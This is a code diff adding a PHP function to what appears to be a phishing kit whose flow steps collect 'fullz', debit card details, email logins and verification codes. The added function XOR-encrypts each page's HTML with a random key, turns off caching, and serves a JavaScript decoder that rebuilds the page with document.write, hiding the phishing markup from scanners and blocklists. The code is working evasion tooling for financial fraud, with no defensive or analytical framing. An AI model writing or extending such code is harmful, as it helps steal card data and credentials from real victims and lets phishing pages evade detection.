@@ -57,6 +57,103 @@ function h4z3_build_step_path($path, $basePath)
     return $normalizedBase . ltrim($path, '/\\');
 }
 
+function h4z3_render_encoded_page($html)
+{
+    if (!is_string($html)) {
+        $html = (string) $html;
+    }
+
+    if (!headers_sent()) {
+        header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
+        header('Pragma: no-cache');
+        header('Expires: 0');
+    }
+
+    $keyLength = 32;
+    $key = '';
+
+    if (function_exists('random_bytes')) {
+        try {
+            $key = random_bytes($keyLength);
+        } catch (Exception $exception) {
+            $key = '';
+        }
+    }
+
+    if ((!is_string($key) || $key === '') && function_exists('openssl_random_pseudo_bytes')) {
+        $opensslKey = openssl_random_pseudo_bytes($keyLength);
+        if (is_string($opensslKey) && $opensslKey !== '') {
+            $key = $opensslKey;
+        }
+    }
+
+    if (!is_string($key) || $key === '') {
+        $fallbackSource = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+        $fallbackLength = strlen($fallbackSource);
+        $fallbackKey = '';
+        for ($i = 0; $i < $keyLength; $i++) {
+            $index = mt_rand(0, $fallbackLength - 1);
+            $fallbackKey .= $fallbackSource[$index];
+        }
+        $key = $fallbackKey;
+    }
+
+    $keyLength = strlen($key);
+    if ($keyLength === 0) {
+        $key = "\0";
+        $keyLength = 1;
+    }
+
+    $encodedBytes = $html;
+    $htmlLength = strlen($html);
+
+    for ($i = 0; $i < $htmlLength; $i++) {
+        $encodedBytes[$i] = $html[$i] ^ $key[$i % $keyLength];
+    }
+
+    $encodedPayload = base64_encode($encodedBytes);
+    $encodedKey = base64_encode($key);
+
+    $jsonPayload = json_encode($encodedPayload, JSON_UNESCAPED_SLASHES);
+    $jsonKey = json_encode($encodedKey, JSON_UNESCAPED_SLASHES);
+
+    $decoder = <<<SCRIPT
+<script>
+(function() {
+    var data = {$jsonPayload};
+    var key = {$jsonKey};
+    function decode(base, secret) {
+        var bytes = atob(base);
+        var keyBytes = atob(secret);
+        if (!keyBytes.length) {
+            return bytes;
+        }
+        var result = [];
+        for (var i = 0; i < bytes.length; i++) {
+            result.push(String.fromCharCode(bytes.charCodeAt(i) ^ keyBytes.charCodeAt(i % keyBytes.length)));
+        }
+        return result.join('');
+    }
+    function inject() {
+        var markup = decode(data, key);
+        document.open();
+        document.write(markup);
+        document.close();
+    }
+    if (document.readyState === 'loading') {
+        inject();
+    } else if (typeof requestAnimationFrame === 'function') {
+        requestAnimationFrame(inject);
+    } else {
+        setTimeout(inject, 0);
+    }
+})();
+</script>
+SCRIPT;
+
+    echo $decoder;
+}
+
 function h4z3_get_flow_steps()
 {
     global $securitypage, $fullzpage, $debitpage, $mailpage, $codepage;
